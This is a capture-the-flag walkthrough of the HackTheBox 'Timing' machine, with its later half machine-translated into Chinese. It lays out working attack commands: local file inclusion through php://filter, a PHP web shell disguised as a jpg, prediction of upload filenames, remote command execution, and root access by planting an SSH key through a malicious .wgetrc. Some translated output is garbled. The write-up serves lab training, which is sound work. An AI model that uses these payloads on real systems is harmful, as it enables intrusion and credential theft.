> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [infosecwriteups.com](https://infosecwriteups.com/timing-from-hackthebox-detailed-walkthrough-7671466227fd)

> Showing you all the tools and techniques needed to complete the box.

Showing you all the tools and techniques needed to complete the box.

[Timing](https://www.hackthebox.com/home/machines/profile/421) is an easy level machine by [irogir](https://www.hackthebox.com/home/users/profile/476556) on [HackTheBox](https://www.hackthebox.com/home). It focuses on application vulnerabilities, both web and shell based.

![](https://miro.medium.com/max/1000/0*9F-Pju3p5vY679p3.png)

Timing from HackTheBox

Our starting point is a login page on the website on port 80, which we find a way in to by looking for files and folders with wfuzz. Using a vulnerable php page we leak credentials and we have access. Further enumeration and code review allows us to escalate our role in the web app to admin. In there we have a way to upload a malicious document containing code execution. We find a way to get the unique file name it has allowing us to execute commands on the box remotely. We exfiltrate a backup and find credentials in there to get ssh as a user. Escalation to root is via a vulnerable app we find on the box, where we exploit its insecure use of wget to gain a root shell.

As always let’s start with Nmap:

![](https://miro.medium.com/max/1400/1*cgDoysoq91D5V3ynwnS2Yg.png)

Nmap scan of the box

Just two ports open, let’s have a look at Apache on port 80:

![](https://miro.medium.com/max/1400/0*CFJUkYdWr3uoBnmy.png)

We have a login box, but nothing else. I tried a few obvious credentials but didn’t get any where so let’s try gobuster:

![](https://miro.medium.com/max/1400/1*wby1XnigWwAuA9l1VVBaqg.png)

gobuster scan for subfolders

Not a lot to go on so I tried looking for files with php extensions and found this:

![](https://miro.medium.com/max/1400/1*AgQJKlq5S6KtOsWSBW1QsQ.png)

gobuster scan for php files

Interesting that the image.php file doesn’t redirect to login.php like the others do. I tried fuzzing, took me quite a while but eventually I ended up with this:

![](https://miro.medium.com/max/1400/1*DKDSDZ815h-aMvJUQYWbCg.png)

wfuzzing the parameters

By using the img parameter and fuzzing I get some responses with 25 chars. This tells us the web server is responding with something. Let’s try and grab the passwd file:

![](https://miro.medium.com/max/1400/1*5U_lL--zjDDk5XchKBFW2A.png)

Trying to download the passwd file with curl

Ok so we’re getting somewhere. Next we need to try and bypass that filter. I used [this](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter) which is something I used on the BountyHunter box [here](https://pencer.io/ctf/ctf-htb-bountyhunter/#base64-encoded-payload):

![](https://miro.medium.com/max/1400/1*5idYKETuOle4F-gIcBhnOQ.png)

Grabbing passwd file with curl

This worked and the response is base64 encoded so we can decode and use grep to just give us the accounts that can logon:

![](https://miro.medium.com/max/1400/1*uh-XrWilNK9TlAKrmNcHyQ.png)

Grabbing passwd file using curl and base64 decode

We have a user called aaron. Going back to that initial login box we saw earlier, now with a username it was simple to login:

![](https://miro.medium.com/max/1400/0*FUUK5RAGIUQv7H9S.png)

Simple WebApp login

We end up here:

![](https://miro.medium.com/max/1400/0*pXBYB8C8ESSgD7Md.png)

Logged in as user 2

We aren’t sure what the significance of being user 2 is at this point, and there’s nothing else you can do once logged in. So going back to our gobuster output I grab the upload.php file:

```
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=upload.php' | base64 -d

```

Looking through the code it’s fairly simple to see what it does. It takes the file uploaded by the user, checks it has a .jpg extension, and stores its name in $file_name. Then it creates a unique hash value by taking the md5 hash of the current time, and combining that with the file name. It then stores the file in /images/uploads. There is one sneaky section of the script that needs to be understood, otherwise you will be stuck trying to determine the filename that has been created.

Looking at the first section of the file:

```
<?php
include("admin_auth_check.php");
$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;

```

Notice that there is a variable called $file_hash created with a value set by uniqid(). [This](https://www.w3schools.com/php/func_misc_uniqid.asp) article explains what the function does, but essentially it’s like time() but in microseconds so a much bigger value. The important bit is here:

```
md5('$file_hash' . time())

```

In PHP single and double quotes work differently with strings. See [this](https://www.geeksforgeeks.org/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php/) article, but basically the value of he $file_hash variable is never used.

We also see there is another file included in this one called admin_auth_check.php, let’s look at that:

```
┌──(root💀kali)-[~]
└─# curl 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php' | base64 -d

<?php
include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}
?>

```

We can see this file is checking the value of the session role. If it’s not equal to 1 then you have no access to a panel. We don’t know what that means yet!

Going back to our web browser, we already have a session authenticated as aaron. If you click on the Edit Profile link at the top you end up here:

![](https://miro.medium.com/max/1400/0*3io637USPqKb-wKA.png)

Edit profile of user

Time to fire up Burp and see what is going on in the background. Once you have Burp intercepting requests and your browser set to use it click that blue update button on the webpage. We intercept the post:

![](https://miro.medium.com/max/1198/0*xuQSL6RjAwhlsl2w.png)

Burp intercept user

Add our new role on the end:

![](https://miro.medium.com/max/1202/0*NfV9SUysSwXApL-k.png)

Burp change role of user

Forward to server, then switch back to browser:

![](https://miro.medium.com/max/836/0*StLibNhHx9_lo8w4.png)

Profile was updated

We see our profile is updated, now refresh your browser to see we have a new option called Admin panel, click on that to get to here:

![](https://miro.medium.com/max/930/0*ZCPlPdfGwSxhGtsV.png)

Access to admin panel

We’ve found the image upload area which is using the PHP file we looked at earlier. It’s safe to assume this will be our method of gaining remote code execution. Let’s start with a simple web shell. We know from the code review that there’s a file extension check, but not a check of the contents of the file. We can easily bypass the check like this:

```
┌──(root💀kali)-[~]
└─# cat pencer.jpg
<?php system($_GET[cmd]);?>

```

We’ve used this a number of time before like on [Nineveh](https://pencer.io/ctf/ctf-htb-nineveh) and [Forge](https://www.hackthebox.eu/home/machines/profile/376). However it’s slightly more complicated here because the resulting filename also has an md5 hash of the current time prepended to it.

We can create our own simple filename generator to help. This is what the PHP file is doing:

```
$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);

```

Let’s test our own version:

```
┌──(root💀kali)-[~/htb/timing]
└─# date
Wed 22 Dec 17:13:27 GMT 2021

```

Use current time:

```
┌──(root💀kali)-[~/htb/timing]
└─# php -a
Interactive mode enabled
php > echo (md5('$file_hash' . strtotime('Wed 22 Dec 17:13:27 GMT 2021')) . '_pencer.jpg');
01c656c2e2adb93593117cb1b3d12808_pencer.jpg

```

So using interactive php mode we can take the line from the code we reviewed and replace time() with the current time on my Kali box. Then append the name of the file we created that will be used for command execution. The resulting filename is what we will need to use once it’s uploaded.

Let’s do it for real. Go back to the upload form and select our web shell:

![](https://miro.medium.com/max/860/0*m4JyrxPHu__5NZop.png)

upload image

Make sure your browser is set to use Burp as the proxy, and that Burp is set to intercept. Click the upload image button then switch to Burp to see it’s intercepted:

![](https://miro.medium.com/max/1400/0*3gCrvFv3BjN2RDF7.png)

Burp intercept image upload

We can see at the bottom our code is intact. Right click and choose Send to Repeater, then switch to the Repeater tab and click Send:

![](https://miro.medium.com/max/1400/0*SgFFsRtc05TKdik8.png)

Burp repeater showing date and time file was uploaded

We see on the right the the file was uploaded, now copy take note of the date and time on the server response:

```
Wed, 22 Dec 2021 17:21:43 GMT

```

We use this with our PHP like before:

```
┌──(root💀kali)-[~/htb/timing]
└─# php -a
Interactive mode enabled
php > echo (md5('$file_hash' . strtotime('Wed, 22 Dec 2021 17:21:43 GMT')) . '_pencer.jpg');
e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg

```

We now have the filename we can call remotely using curl. Let’s test it with whoami:

```
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=whoami'
www-data

```

That works. However I spent a long time trying to get a reverse shell with no luck. Back to enumerating the file system and eventually I found this:

```
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=ls+-lsa+/opt' 
total 624
616 -rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip

```

A backup file, we definitely want to have a look at that. First copy it to the uploads folder that we have access to:

```
┌──(root💀kali)-[~/htb/timing]
└─# curl 'http://timing.htb/image.php?img=images/uploads/e087b23f34a4f7d6c841db302e7d88ca_pencer.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'

```

Now we can download it:

![](https://miro.medium.com/max/1400/1*6nC_lupU4z63mo5p5HyGTg.png)

Download backup.zip using curl

Unzip it and have a look:

![](https://miro.medium.com/max/1400/1*iewntDlcSvqVNtKnGmzy7w.png)

Unzip backup file

Looking through the files we find something interesting in db_conn.php:

```
┌──(root💀kali)-[~/htb/timing/backup]
└─# cat db_conn.php                  
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

```

Could it be that aaron has reused that mysql password for ssh access:

```
┌──(root💀kali)-[~/htb/timing/extracted]
└─# ssh aaron@timing.htb
aaron@timing.htb's password: 
Permission denied, please try again.

```

Ok that didn’t work. However looking further at the backup files we see there’s a Git repository. Seems a little suspicious!

Let’s use GitTools like we did on [Devzat](https://www.hackthebox.com/home/machines/profile/398) and extract the source files. Download them if needed:

```
┌──(root💀kali)-[~/htb/devzat]
└─# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 229, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 229 (delta 6), reused 7 (delta 2), pack-reused 209
Receiving objects: 100% (229/229), 52.92 KiB | 1.65 MiB/s, done.
Resolving deltas: 100% (85/85), done.

```

Use the extractor script on the backup folder:

![](https://miro.medium.com/max/1400/1*P_JgXDsBK16b3CIta2G7gg.png)

Extract git archive using GitTools

Now look at the extractor files:

```
┌──(root💀kali)-[~/htb/timing]
└─# ll extracted 
drwxr-xr-x 5 root root 4096 Dec 22 17:43 0-16de2698b5b122c93461298eab730d00273bd83e
drwxr-xr-x 5 root root 4096 Dec 22 17:43 1-e4e214696159a25c69812571c8214d2bf8736a3f

```

There are two commits. Again like we did on Devzat we can use diff as a simple way to see what changed between commits:

![](https://miro.medium.com/max/1400/1*jVd9HzTisSen3NqQr7puxQ.png)

Use diff to check changes between folders

The only change is the password in that db_conn.php file we tried earlier with aaron on SSH. Let’s try this one:

```
┌──(root💀kali)-[~/htb/timing/extracted]
└─# ssh aaron@timing.htb
aaron@timing.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

  System information as of Wed Dec 22 17:45:49 UTC 2021

Last login: Wed Dec 22 17:41:31 2021 from 10.10.14.124
aaron@timing:~$

```

Ok, we knew that was gonna work didn’t we!

As usual, check the few obvious things before using something like LinPEAS. Here I started with sudo which was the right place:

```
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils

```

What is netutils:

```
aaron@timing:~$ file /usr/bin/netutils
/usr/bin/netutils: Bourne-Again shell script, ASCII text executable

aaron@timing:~$ cat /usr/bin/netutils
#! /bin/bash
java -jar /root/netutils.jar

```

This shell script runs a Java application in the root folder, and we can run it as root without a password. Sounds interesting, let’s have a look what it does:

```
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >>

```

We have two options with this util, FTP or HTTP, whichever you pick it then asks for a file. This can be hosted remotely, so let’s start a webserver on Kali first:

```
┌──(root💀kali)-[~/htb/timing]
└─# python3 -m http.server 80

```

Now switch back to the box and try to grab a file from Kali:

```
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 0
Enter Url+File: 10.10.14.12/pencer.jpg

```

I tried grabbing that fake jpg we made earlier using FTP but nothing happened. Checking my webserver on Kali there was no connection attempt. Let’s try http:

```
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.12/pencer.jpg
Initializing download: http://10.10.14.12/pencer.jpg
File size: 28 bytes
Opening output file pencer.jpg
Server unsupported, starting from scratch with one connection.
Starting download
Downloaded 28 byte in 0 seconds. (0.27 KB/s)

```

That looks more promising. Checking our webserver on Kali I see a connection from the box and the file was retrieved. Looking locally I see the file is there, and it’s owned by root.

We could pull a file across using wget, so we can assume there is a vulnerability in this util that we need to exploit. To understand how it works lets use pspy64 just like we did many other times, most recently on [Static](https://app.hackthebox.com/machines/355). If you haven’t already got it the grab from [here](https://github.com/DominicBreuker/pspy), I have it already so just need to copy it to the path of my webserver I’m running on Kali:

```
┌──(root💀kali)-[~]
└─# locate pspy64
/root/htb/static/pspy64

┌──(root💀kali)-[~]
└─# cd htb/timing

┌──(root💀kali)-[~/htb/timing]
└─# cp /root/htb/static/pspy64 .

```

Now back to the box, pull pspy64 across and start it running:

![](https://miro.medium.com/max/1400/1*4345YFcxufb5g_wENcM_6A.png)

Pspy running on the box

With that running in our current SSH session log in to a second one and then run netutils again. Do the same option 0 for FTP and option 1 for HTTP as before, again trying to pull my pencer.jpg file across. Now switch back to the pspy64 session to see what is happening:

![](https://miro.medium.com/max/1400/1*1z1AJ3E2nk76_S6KQs3HrA.png)

Pspy shows wget is being used

We can see the netutils java app is using wget for FTP connections, and axel for HTTP. I later found It’s possible to complete this box by exploiting axel, but I did it using FTP so we’ll follow that method.

There’s another HTB box called Kotarak that has a similar path, [this](https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html) walk through helped me here. The key part to know is that wget looks for a startup file when it’s run. From the docs [here](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html) we can see how that works:

```
When initializing, Wget will look for a global startup file, /usr/local/etc/wgetrc by default (or some prefix other than /usr/local, if Wget was not installed there) and read commands from there, if it exists.

Then it will look for the user’s file. If the environmental variable WGETRC is set, Wget will try to load that file. Failing that, no further attempts will be made.

如果未设置 WGETRC，Wget 将尝试加载 $HOME/.wgetrc。

```

在此框中，我们发现没有全局文件，因此我们可以通过在 aaron 的 /home 文件夹中创建自己的 .wgetrc 文件来利用它。[查看此处](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html)的可用命令，我们看到有一个选项可以设置检索到的文件的名称和路径。我们可以以 root 身份运行 java 应用程序，因此我们可以访问 /root 作为可写位置。让我们把我们的 Kali 公共 SSH 密钥放在那里，这样我们就可以在没有密码的情况下以 root 身份登录。

首先在 /home/aaron 中创建 .wgetrc 配置文件：

```
aaron@timing:~$ cat <<_EOF_>.wgetrc
> output_document = /root/.ssh/authorized_keys
> _EOF_

```

如果需要，在 Kali 上创建我们的 SSH 密钥：

```
┌── (根💀kali) - [~]
└─# ssh-keygen          
生成公钥/私钥 rsa 密钥对。
输入保存密钥的文件 (/root/.ssh/id_rsa)：
输入密码（无密码为空）：
再次输入相同的密码：
您的身份已保存在 /root/.ssh/id_rsa
您的公钥已保存在 /root/.ssh/id_rsa.pub
关键指纹是：
SHA256:B/SsKx8Z8AU/c40jKybaq8OpWpTVdl2Yz0e/ktMxXxY root@kali
密钥的 randomart 图像是：
+---[RSA 3072]----+
| 哦哦。|
| . . *ooE |
| . + o Xo + .... |
| ○。+ + * o..o + |
| 欧。苏.o.*|
| . oo * + o。
| .... o + o |
| .  +  + .       |
|…… 的。. |
+----[SHA256]-----+

```

将公钥副本放在我们的工作文件夹中：

```
┌── (根💀kali) - [~]
└─# cp .ssh/id_rsa.pub htb/timing

```

如果需要，安装 Python3 FTP 库：

![](https://miro.medium.com/max/1400/1*2PteNGaxYJWli2i0CdlScg.png)

安装 pyftpdlib

现在启动一个 FTP 服务器，这样我们就可以获取我们的 SSH 公钥：

```
┌──(root💀kali)-[~/htb/timing]
└─# python3 -m pyftpdlib -p 21
[我 2021-12-29 22:15:26] 并发模型：异步
[I 2021-12-29 22:15:26] 伪装（NAT）地址：无
[I 2021-12-29 22:15:26] 被动端口：无
[I 2021-12-29 22:15:26] >>> 在 0.0.0.0:21 启动 FTP 服务器，pid=1597 <<<

```

切换回该框并再次运行 netutils 应用程序，这次为 FTP 选择 0 并输入我们的 Kali IP 和我们在那里托管的 SSH 公钥：

```
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
选择一个选项：
[0] FTP
[1] HTTP
[2] 退出
输入 >> 0
输入网址+文件：10.10.14.12/id_rsa.pub

```

现在回到 Kali 并检查文件是否被请求：

![](https://miro.medium.com/max/1400/1*RU6AfT34n48qT3qUp0A68A.png)

Kali 上运行的 FTP 服务器

是的，所以启动一个新终端并以 root 身份登录到该框：

```
┌──(root💀kali)-[~/htb/timing]
└─# ssh root@timing.htb  
欢迎使用 Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
最后登录时间：2021 年 12 月 7 日星期二 12:08:29
root@timing:~#

```

拿起旗帜，我们就完成了：

```
root@timing:~# cat /root/root.txt
<隐藏>

```

这是另一个盒子完成的。我真的很喜欢这个，因为它需要一些思考才能完成。下次见。